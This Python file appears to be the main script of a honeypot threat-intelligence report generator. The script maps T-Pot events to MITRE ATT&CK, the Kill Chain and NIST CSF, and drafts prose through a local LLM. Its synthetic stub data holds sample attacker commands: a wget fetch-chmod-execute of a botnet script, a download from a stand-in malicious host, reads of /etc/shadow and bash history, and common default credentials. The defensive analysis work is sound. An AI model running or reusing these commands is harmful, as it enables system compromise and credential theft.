"""
ARGUS — AI-Assisted Threat Intelligence Platform
--------------------------------------------------------------------------------
Local LLM-powered threat intelligence report generator for T-Pot honeypot data.

Modes:
    --test-ollama        : smoke test Ollama end-to-end (no ES needed)
    --stub               : run full pipeline against realistic synthetic data
    --period {daily,weekly,monthly}
    --style {brief,full} : brief = executive brief; full = analyst detail
    --theme {dark,light} : chart/report theme

Pipeline:
    1. Aggregate honeypot events into summary metrics
    2. Classify commands against MITRE ATT&CK
    3. Classify sessions across Cyber Kill Chain stages
    4. Generate NIST CSF-aligned recommendations
    5. Render charts (matplotlib, Aurora Ops theme)
    6. Generate narrative prose via Ollama LLM
    7. Render Jinja2 report template → Markdown
    8. Save to reports/ (convertible to PDF/DOCX via pandoc)
"""
from __future__ import annotations

import argparse
import os
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, Any
from zoneinfo import ZoneInfo
from naming import build_report_filename, build_chart_dir_name

import requests
import yaml
from jinja2 import Environment, FileSystemLoader, select_autoescape

from frameworks.mitre_mapper import MitreMapper, mitre_link, mitre_tactic_link
from frameworks.kill_chain import KillChainClassifier, KILL_CHAIN_STAGES, kill_chain_link
from frameworks.nist_csf import NistCsfGenerator, csf_link
import charts


def _load_validation_summary():
    """Load latest three-feed IP validation summary for the report footer.

    Delegates to validate_ips.load_summary() which reads analyzer/validation_ips.csv
    and returns a dict with exact counts, or None if the CSV is absent.
    """
    try:
        from validate_ips import load_summary
        return load_summary()
    except Exception:
        return None


def _write_proposal_metrics_snapshot(data, mitre_technique_freq, mitre_tactic_freq, kc_distribution, period, hours):
    """Persist proposal-committed evaluation metrics to a JSON snapshot for the UI.

    Reads directly from the aggregated `data` dict and framework outputs
    already computed by the pipeline. Every value is an exact integer or a
    rounded percentage. No range or fuzzy figures.

    Written to analyzer/proposal_metrics.json. Consumed by the ARGUS Control
    Center System Health view (Proposal Evaluation Metrics + Framework Coverage
    card sections).
    """
    import json as _json
    from zoneinfo import ZoneInfo as _ZoneInfo

    total_attacks = int(data.get("total_attacks", 0) or 0)
    unique_ips = int(data.get("unique_source_ips", 0) or 0)
    unique_countries = int(data.get("unique_countries",
                                    len(data.get("top_source_countries", []))))

    # ---- Sensor Engagement Rate ----
    session_details = data.get("session_details", []) or []
    sessions_with_commands = sum(
        1 for s in session_details
        if isinstance(s, dict) and int(s.get("commands_executed", 0) or 0) >= 1
    )
    engagement_rate = (
        round(100.0 * sessions_with_commands / total_attacks, 2)
        if total_attacks > 0 else 0.0
    )

    # ---- Credential Reuse Frequency ----
    top_creds = data.get("top_credentials_attempted", []) or []
    top_cred_pair = ""
    top_cred_count = 0
    top_cred_ratio = 0.0
    if top_creds:
        top_cred_count = int(top_creds[0].get("count", 0) or 0)
        top_cred_pair = f"{top_creds[0].get('username', '?')}:{top_creds[0].get('password', '?')}"
        if total_attacks > 0:
            top_cred_ratio = round(100.0 * top_cred_count / total_attacks, 2)

    # ---- Session Completeness Ratio ----
    complete_sessions = sum(
        1 for s in session_details
        if isinstance(s, dict) and (
            int(s.get("commands_executed", 0) or 0) >= 1
            or int(s.get("failed_auth_attempts", 0) or 0) >= 1
        )
    )
    completeness_ratio = (
        round(100.0 * complete_sessions / total_attacks, 2)
        if total_attacks > 0 else 0.0
    )

    # ---- Framework Coverage ----
    mitre_techniques_observed = len(mitre_technique_freq or {})
    mitre_tactics_observed = len(mitre_tactic_freq or {})
    kill_chain_stages_reached = sum(1 for c in (kc_distribution or {}).values() if c > 0)
    top_tactic_name = ""
    top_tactic_count = 0
    if mitre_tactic_freq:
        top_tactic_name, top_tactic_count = max(
            mitre_tactic_freq.items(), key=lambda kv: kv[1]
        )

    tz = _ZoneInfo("Asia/Kuala_Lumpur")
    snapshot = {
        "timestamp": datetime.now(tz).isoformat(timespec="seconds"),
        "reporting_period": period,
        "window_hours": hours,
        # Proposal-committed metrics (Ch 3.9)
        "total_attacks": total_attacks,
        "unique_source_ips": unique_ips,
        "unique_countries": unique_countries,
        "sessions_with_commands": sessions_with_commands,
        "engagement_rate_percent": engagement_rate,
        "top_credential_pair": top_cred_pair,
        "top_credential_count": top_cred_count,
        "top_credential_ratio_percent": top_cred_ratio,
        "complete_sessions": complete_sessions,
        "completeness_ratio_percent": completeness_ratio,
        # Framework coverage
        "mitre_techniques_observed": mitre_techniques_observed,
        "mitre_tactics_observed": mitre_tactics_observed,
        "mitre_tactics_total": 14,  # ATT&CK Enterprise v14 tactic count
        "kill_chain_stages_reached": kill_chain_stages_reached,
        "kill_chain_stages_total": 7,
        "top_tactic_name": top_tactic_name,
        "top_tactic_count": top_tactic_count,
        "nist_csf_functions_covered": 5,  # generator emits at least one per Core Function
        "nist_csf_functions_total": 5,
    }

    snapshot_path = Path(__file__).parent / "proposal_metrics.json"
    try:
        snapshot_path.write_text(_json.dumps(snapshot, indent=2))
    except Exception:
        # Non-fatal: snapshot is a UI convenience, do not break the report pipeline
        pass


# ---------------------------------------------------------------- config
def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)


# ---------------------------------------------------------------- Ollama
def call_ollama(prompt: str, model: str, base_url: str,
                temperature: float = 0.3, timeout: int = 300) -> str:
    """Send prompt to Ollama /api/generate and return the response text."""
    url = f"{base_url}/api/generate"
    payload = {
        "model": model,
        "prompt": prompt,
        "stream": False,
        "options": {"temperature": temperature},
    }
    response = requests.post(url, json=payload, timeout=timeout)
    response.raise_for_status()
    return response.json()["response"]


# ---------------------------------------------------------------- ES 
def query_elasticsearch(config: dict, hours: int) -> Dict[str, Any]:
    """Query T-Pot Elasticsearch via es_client.py."""
    from es_client import TpotEsClient

    es_cfg = config["elasticsearch"]
    client = TpotEsClient(
        hosts=es_cfg["hosts"],
        username=es_cfg.get("username", ""),
        password=es_cfg.get("password", ""),
        verify_certs=es_cfg.get("verify_certs", False),
        timeout=30,
    )
    if not client.ping():
        raise RuntimeError(
            "Elasticsearch not reachable at "
            f"{es_cfg['hosts']}. Is the SSH tunnel running?"
        )
    return client.query_window(hours=hours)


# ---------------------------------------------------------------- Stub data
def generate_stub_data(hours: int = 24) -> Dict[str, Any]:
    """Realistic synthetic T-Pot output for template iteration before real ES hookup."""
    import random
    random.seed(42)
    return {
        "total_attacks": 1847,
        "unique_source_ips": 342,
        "unique_countries": 47,
        "malware_captured": 2,
        "top_source_countries": [
            {"country": "China", "count": 612, "percentage": 33.1},
            {"country": "United States", "count": 287, "percentage": 15.5},
            {"country": "Russia", "count": 189, "percentage": 10.2},
            {"country": "Netherlands", "count": 143, "percentage": 7.7},
            {"country": "Brazil", "count": 121, "percentage": 6.5},
            {"country": "Germany", "count": 98, "percentage": 5.3},
            {"country": "India", "count": 87, "percentage": 4.7},
            {"country": "France", "count": 71, "percentage": 3.8},
            {"country": "United Kingdom", "count": 63, "percentage": 3.4},
            {"country": "Vietnam", "count": 54, "percentage": 2.9},
        ],
        "top_attacked_ports": [
            {"port": 22, "service": "SSH", "count": 862, "percentage": 46.7},
            {"port": 445, "service": "SMB", "count": 234, "percentage": 12.7},
            {"port": 3306, "service": "MySQL", "count": 189, "percentage": 10.2},
            {"port": 80, "service": "HTTP", "count": 156, "percentage": 8.4},
            {"port": 23, "service": "Telnet", "count": 134, "percentage": 7.3},
            {"port": 21, "service": "FTP", "count": 89, "percentage": 4.8},
            {"port": 8080, "service": "HTTP-alt", "count": 67, "percentage": 3.6},
            {"port": 3389, "service": "RDP", "count": 54, "percentage": 2.9},
            {"port": 1433, "service": "MSSQL", "count": 34, "percentage": 1.8},
            {"port": 5900, "service": "VNC", "count": 28, "percentage": 1.5},
        ],
        "top_credentials_attempted": [
            {"username": "root", "password": "123456", "count": 89},
            {"username": "admin", "password": "admin", "count": 67},
            {"username": "root", "password": "root", "count": 54},
            {"username": "root", "password": "password", "count": 45},
            {"username": "user", "password": "user", "count": 34},
            {"username": "ubuntu", "password": "ubuntu", "count": 28},
        ],
        "top_source_ips": [
            {"ip": "45.61.185.100", "count": 87, "country": "China"},
            {"ip": "185.220.101.15", "count": 71, "country": "Netherlands"},
            {"ip": "178.62.109.45", "count": 54, "country": "United States"},
            {"ip": "94.102.51.28", "count": 43, "country": "Russia"},
            {"ip": "203.0.113.42", "count": 38, "country": "China"},
        ],
        "malware_hashes": [
            {"sha256": "8a7f5e2c1b0d4e6f8a9c3d5e7f9a1b3c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5a",
             "filename": "x86.linux.mirai", "sensor": "Dionaea"},
            {"sha256": "3e5a7c9d1f3b5d7e9a1c3e5f7a9c1e3d5f7a9c1e3d5f7b9c1e3d5f7a9c1e3d5f",
             "filename": "arm.iot.loader", "sensor": "Dionaea"},
        ],
        "hourly_trend": [45, 38, 52, 41, 67, 89, 112, 134, 156, 145, 132, 128,
                         119, 108, 94, 87, 76, 62, 54, 48, 43, 38, 34, 45],
        "notable_sessions": [
            "Session S-1247 from 45.61.185.100 (China) attempted 52 SSH login combinations in 8 seconds, then successfully authenticated as root:123456. Attacker executed `uname -a; cat /proc/cpuinfo; wget http://45.61.185.100/x86.sh; chmod +x x86.sh; ./x86.sh` — Mirai-family botnet enrollment attempt. Cowrie terminated after ~12s.",
            "Session S-1583 from 178.62.109.45 (US) sent 47 SMB negotiation packets against Dionaea port 445 within a 3-second window — pattern consistent with EternalBlue vulnerability scanning. No successful exploitation observed.",
            "Session S-1892 from 185.220.101.15 (Netherlands / Tor exit node) attempted 189 MySQL login combinations against port 3306, exclusively targeting root and admin usernames. Fully automated brute force; no post-auth activity.",
            "Session S-2104 from 94.102.51.28 (Russia) authenticated to Cowrie as ubuntu:ubuntu and executed `whoami; id; sudo -l; cat /etc/passwd; cat /etc/shadow; history` — reconnaissance for privilege escalation opportunity.",
            "Session S-2417 from 203.0.113.42 (China) attempted URL path enumeration on port 80 against Snare, requesting 34 known WordPress admin paths (`/wp-admin`, `/wp-login.php`, `/xmlrpc.php`) — commodity CMS scanner.",
        ],
        "session_details": [
            {"auth_success": True, "commands_executed": 5, "file_downloads": 1,
             "persistence_actions": 0, "c2_indicators": 0} for _ in range(3)
        ] + [
            {"auth_success": True, "commands_executed": 4, "file_downloads": 0,
             "persistence_actions": 0, "c2_indicators": 0} for _ in range(6)
        ] + [
            {"auth_success": False, "failed_auth_attempts": 50, "commands_executed": 0,
             "file_downloads": 0} for _ in range(1838)
        ],
        "all_commands": [
            "uname -a", "cat /proc/cpuinfo", "wget http://mal.example/x.sh",
            "chmod +x x.sh", "whoami", "id", "sudo -l",
            "cat /etc/passwd", "cat /etc/shadow", "history",
            "ps aux", "netstat -antp", "ifconfig", "ip addr",
            "crontab -l", "cat ~/.bash_history",
        ],
    }


# ---------------------------------------------------------------- Pipeline
def run_pipeline(
    config: dict,
    data: Dict[str, Any],
    style: str,
    period: str,
    hours: int,
    output_dir: str,
    theme: str = "dark",
) -> str:
    system = config["system"]
    org = config["report"]["organization"]
    tz = ZoneInfo(config["report"].get("timezone", "UTC"))

    # ---- MITRE ATT&CK ----
    mapper = MitreMapper()
    observations = mapper.map_commands(data["all_commands"])
    mitre_tactic_freq = mapper.tactic_frequency(observations)
    mitre_technique_freq = mapper.technique_frequency(observations)
    heatmap_data = mapper.heatmap_matrix(observations)

    # ---- Kill Chain ----
    classifier = KillChainClassifier()
    kc_distribution = classifier.classify_batch(data["session_details"])
    kc_narrative = classifier.stage_narrative(kc_distribution)

    # ---- NIST CSF ----
    csf_generator = NistCsfGenerator()
    if style == "brief":
        recommendations = csf_generator.generate(
            tactic_frequency=mitre_tactic_freq,
            kill_chain_distribution=kc_distribution,
            top_ports=[p["port"] for p in data["top_attacked_ports"]],
            malware_hashes_captured=data.get("malware_captured", 0),
            unique_source_ips=data["unique_source_ips"],
            max_recommendations=5,
        )
    else:
        recommendations = csf_generator.generate(
            tactic_frequency=mitre_tactic_freq,
            kill_chain_distribution=kc_distribution,
            top_ports=[p["port"] for p in data["top_attacked_ports"]],
            malware_hashes_captured=data.get("malware_captured", 0),
            unique_source_ips=data["unique_source_ips"],
            per_function_min=2,
        )

    # ---- Charts ----
    now = datetime.now(tz)
    ts = now.strftime("%Y%m%d_%H%M%S")
    chart_dir_name = build_chart_dir_name(period=period, theme=theme, timestamp=now)
    chart_dir = Path(output_dir) / chart_dir_name
    chart_dir.mkdir(parents=True, exist_ok=True)

    chart_geo = charts.plot_geo_origins(data["top_source_countries"], str(chart_dir / "geo.png"), theme=theme)
    chart_ports = charts.plot_port_targeting(data["top_attacked_ports"], str(chart_dir / "ports.png"), theme=theme)
    chart_hourly = charts.plot_hourly_trend(data["hourly_trend"], str(chart_dir / "hourly.png"), theme=theme)
    chart_kill_chain = charts.plot_kill_chain_distribution(kc_distribution, str(chart_dir / "kill_chain.png"), theme=theme)
    chart_mitre_heatmap = charts.plot_attack_tactics_heatmap(heatmap_data, str(chart_dir / "mitre_heatmap.png"), theme=theme)
    chart_ip_by_country = charts.plot_ip_by_country(data.get("top_source_ips", []), str(chart_dir / "ip_by_country.png"), theme=theme)

    # ---- LLM narrative ----
    prompts_env = Environment(
        loader=FileSystemLoader("prompts"),
        autoescape=select_autoescape(disabled_extensions=("j2",)),
    )
    prompt_template = prompts_env.get_template(f"daily_{style}.j2")
    prompt_context = {
        "data": data,
        "window_hours": hours,
        "system_name": system["name"],
        "kill_chain_narrative": kc_narrative,
        "kill_chain_distribution": kc_distribution,
        "mitre_tactic_freq": mitre_tactic_freq,
        "notable_hint": data["notable_sessions"][0] if data["notable_sessions"] else "no notable sessions",
    }
    prompt_text = prompt_template.render(**prompt_context)

    print(f"  → Calling Ollama at {config['ollama']['base_url']} model='{config['ollama']['model']}' temp={config['ollama'].get('temperature', 0.3)}...")
    print(f"    Prompt length: {len(prompt_text)} chars")

    narrative_text = call_ollama(
        prompt=prompt_text,
        model=config["ollama"]["model"],
        base_url=config["ollama"]["base_url"],
        temperature=config["ollama"].get("temperature", 0.3),
        timeout=config["ollama"].get("timeout", 300),
    )
    print(f"    Received {len(narrative_text)} chars of narrative")

    n_sections = 3 if style == "brief" else 5
    raw_sections = [s.strip() for s in narrative_text.split("\n\n") if s.strip()]
    sections = raw_sections[:n_sections]
    while len(sections) < n_sections:
        sections.append("*(LLM did not produce this section — regenerate or edit template.)*")

    # ---- Template render ----
    env = Environment(
        loader=FileSystemLoader("templates"),
        autoescape=select_autoescape(disabled_extensions=("j2",)),
    )
    env.filters["number_format"] = lambda n: f"{n:,}"

    # Framework reference-link filters — used to hyperlink IDs in the report
    # so readers can jump straight to canonical documentation.
    env.filters["mitre_link"] = mitre_link
    env.filters["mitre_tactic_link"] = mitre_tactic_link
    env.filters["csf_link"] = csf_link
    env.filters["kill_chain_link"] = kill_chain_link

    template = env.get_template(f"report_{style}.md.j2")

    now = datetime.now(tz)
    window_start = now - timedelta(hours=hours)

    render_context = {
        # Branding
        "system_name": system["name"],
        "system_tagline": system["tagline"],
        "system_version": system["version"],
        "organization": org,
        # Timing
        "report_date": now.strftime("%Y-%m-%d"),
        "report_datetime": now.strftime("%Y-%m-%d %H:%M %Z"),
        "generated_at": now.isoformat(timespec="seconds"),
        "window_hours": hours,
        "window_start": window_start.strftime("%Y-%m-%d %H:%M"),
        "window_end": now.strftime("%Y-%m-%d %H:%M"),
        "theme": theme,
        # Data
        "data": data,
        "mitre_tactic_freq": mitre_tactic_freq,
        "mitre_technique_freq": mitre_technique_freq,
        "kill_chain_distribution": kc_distribution,
        "recommendations": recommendations,
        # Charts (paths relative to output_dir so images render in place)
        "chart_geo": os.path.relpath(chart_geo, output_dir),
        "chart_ports": os.path.relpath(chart_ports, output_dir),
        "chart_hourly": os.path.relpath(chart_hourly, output_dir),
        "chart_kill_chain": os.path.relpath(chart_kill_chain, output_dir),
        "chart_mitre_heatmap": os.path.relpath(chart_mitre_heatmap, output_dir),
        "chart_ip_by_country": os.path.relpath(chart_ip_by_country, output_dir),
        "baseline_available": False,
        # External threat-feed validation summary. Loaded from
        # analyzer/validation_ips.csv (produced by validate_ips.py).
        # None if not yet generated; template renders a fallback stanza.
        "validation_summary": _load_validation_summary(),
    }
    for i, sec in enumerate(sections, 1):
        render_context[f"llm_narrative_section_{i}"] = sec

    report_body = template.render(**render_context)

    # ---- Save ----
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    filename = build_report_filename(
        system_name=system["name"],
        period=period,
        style=style,
        theme=theme,
        timestamp=now,
        extension="md",
    )
    filepath = output_path / filename
    filepath.write_text(report_body)

    # Write proposal-committed metrics snapshot for the UI dashboard.
    # Non-fatal on failure (report is already written).
    try:
        _write_proposal_metrics_snapshot(
            data=data,
            mitre_technique_freq=mitre_technique_freq,
            mitre_tactic_freq=mitre_tactic_freq,
            kc_distribution=kc_distribution,
            period=period,
            hours=hours,
        )
    except Exception as e:
        print(f"  ⚠ proposal_metrics.json write failed: {e}")

    return str(filepath)


# ---------------------------------------------------------------- CLI
def print_banner(system: dict) -> None:
    name = system["name"]
    tagline = system["tagline"]
    version = system["version"]
    bar = "═" * (max(len(tagline), 60) + 4)
    print(f"╔{bar}╗")
    print(f"║  {name} v{version}".ljust(len(bar) + 1) + "║")
    print(f"║  {tagline}".ljust(len(bar) + 1) + "║")
    print(f"╚{bar}╝")


def main() -> int:
    parser = argparse.ArgumentParser(description="ARGUS — AI-Assisted Threat Intelligence Platform")
    parser.add_argument("--config", default="config.yml")
    parser.add_argument("--period", choices=["daily", "weekly", "monthly"], default="daily")
    parser.add_argument("--style", choices=["brief", "full"], default="brief")
    parser.add_argument("--stub", action="store_true", help="Use synthetic data")
    parser.add_argument("--theme", choices=["dark", "light"], default="dark")
    parser.add_argument("--test-ollama", action="store_true", help="Ollama smoke test only")
    args = parser.parse_args()

    if args.test_ollama and not os.path.exists(args.config):
        config = {
            "system": {"name": "ARGUS", "tagline": "Threat Intelligence Analyser", "version": "0.1"},
            "ollama": {"base_url": "http://localhost:11434", "model": "llama3.2:3b", "timeout": 120, "temperature": 0.3},
        }
    else:
        config = load_config(args.config)

    print_banner(config["system"])

    if args.test_ollama:
        prompt = "In one sentence, explain what a low-interaction honeypot is in cybersecurity."
        print(f"→ Ollama smoke test at {config['ollama']['base_url']}...")
        response = call_ollama(prompt, config["ollama"]["model"], config["ollama"]["base_url"],
                               temperature=config["ollama"].get("temperature", 0.3),
                               timeout=config["ollama"].get("timeout", 120))
        print(f"\n{response}\n")
        return 0

    hours_map = {"daily": 24, "weekly": 168, "monthly": 720}
    hours = hours_map[args.period]

    # Metrics recorder wraps the entire pipeline for Ch 4 reliability table.
    # No-op if the module import fails (backward compatible).
    from metrics import PipelineMetrics
    import time as _time

    pipeline_metrics = PipelineMetrics(
        period=args.period,
        style=args.style,
        theme=args.theme,
        mode="stub" if args.stub else "live",
    )

    try:
        if args.stub:
            print(f"→ Synthetic data mode ({args.period}, {hours}h window)")
            data = generate_stub_data(hours)
        else:
            print(f"→ Querying Elasticsearch (last {hours}h)...")
            data = query_elasticsearch(config, hours)
            if data["total_attacks"] == 0:
                print("⚠ No ES data returned. Use --stub for template iteration.")
                pipeline_metrics.mark_failure("no ES data")
                return 1

        output_dir = config["report"]["output_dir"]
        filepath = run_pipeline(config, data, args.style, args.period, hours, output_dir, args.theme)

        print(f"\n✓ Report written: {filepath}")

        # --- Real PDF/DOCX render (was previously print-only) ---
        from exporters import render_pdf, render_docx

        md_path_obj = Path(filepath)

        _pdf_start = _time.perf_counter()
        pdf_out, pdf_err = render_pdf(md_path_obj)
        pipeline_metrics.record_pdf(_time.perf_counter() - _pdf_start, bool(pdf_out))
        if pdf_out:
            print(f"  ✓ PDF:  {pdf_out}")
        else:
            print(f"  ✗ PDF failed: {pdf_err}")

        _docx_start = _time.perf_counter()
        docx_out, docx_err = render_docx(md_path_obj)
        pipeline_metrics.record_docx(_time.perf_counter() - _docx_start, bool(docx_out))
        if docx_out:
            print(f"  ✓ DOCX: {docx_out}")
        else:
            print(f"  ✗ DOCX failed: {docx_err}")

        pipeline_metrics.mark_success()
        return 0

    except Exception as e:
        pipeline_metrics.mark_failure(f"{type(e).__name__}: {e}")
        raise
    finally:
        pipeline_metrics.write()

if __name__ == "__main__":
    sys.exit(main())